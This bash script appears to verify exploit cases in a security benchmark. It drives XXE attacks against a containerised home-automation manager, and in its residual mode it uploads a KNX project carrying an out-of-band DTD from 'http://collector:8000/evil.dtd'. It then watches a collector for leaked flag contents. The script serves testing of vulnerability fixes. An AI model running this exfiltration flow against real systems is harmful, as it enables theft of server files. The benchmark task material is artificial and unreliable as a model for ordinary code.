#!/usr/bin/env bash
# verify.sh --seed|--residual
# seed: CVE-2026-40882 Velbus XXE file:///flag (in-band asset name)
# residual: CVE-2026-54640 KNX ETS OOB DTD (sibling incomplete fix on 1.22.0)
# 0=flag observed  10=blocked  20=env  30=usage
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

MGR_PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port manager 8080 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
COLL_PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port collector 8000 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$MGR_PORT" ]] || { echo "verify: manager port missing" >&2; exit 20; }
BASE="http://127.0.0.1:${MGR_PORT}"
COLL="http://127.0.0.1:${COLL_PORT}"
export PCB_TARGET_BASE="$BASE"

if [[ "$MODE" == "--seed" ]]; then
  OUT="$("$PY" "$CASE_DIR/poc/original_poc.py" "$BASE" 2>&1)" || { echo "$OUT" >&2; exit 20; }
else
  # Sibling sink still open on 1.22.0: KNXProtocol.startAssetImport (Saxon + StAX).
  # Inline literals only — no heldout / reference_witness refs.
  [[ -n "$COLL_PORT" ]] || { echo "verify: collector port missing" >&2; exit 20; }
  OUT="$("$PY" - "$BASE" "$COLL" "$CASE_DIR" <<'PY'
import sys, os, time, threading
base, coll, case_dir = sys.argv[1], sys.argv[2], sys.argv[3]
sys.path.insert(0, os.path.join(case_dir, "poc"))
import orlib
token = orlib.get_token(base)
agent_id = orlib.create_knx_agent(base, token, host="10.255.255.1")
time.sleep(10)
orlib.collector_reset(coll)
box = {"status": None, "err": ""}
def _imp():
    try:
        box["status"], _ = orlib.do_import(
            base, token, agent_id,
            orlib.build_knx_oob_payload("http://collector:8000/evil.dtd"),
            name="knx-import-testproject.knxproj",
        )
    except Exception as e:
        box["err"] = str(e)[:200]
t = threading.Thread(target=_imp, daemon=True)
t.start()
hits = ""
for _ in range(45):
    time.sleep(1)
    hits = orlib.collector_hits(coll)
    if "LEAK f=" in hits:
        break
t.join(timeout=2)
print("HTTP", box["status"], "err", box["err"], "collector_hits:", hits.strip())
for line in hits.splitlines():
    if line.startswith("LEAK f="):
        print("FLAG_READ:", line[len("LEAK f="):].strip())
        break
else:
    print("BLOCKED (no OOB exfil reached the collector)")
PY
)" || { echo "$OUT" >&2; exit 20; }
fi

echo "${OUT:0:500}"
if grep -Fq "$RUN_FLAG" <<<"$OUT"; then
  exit 0
fi
exit 10
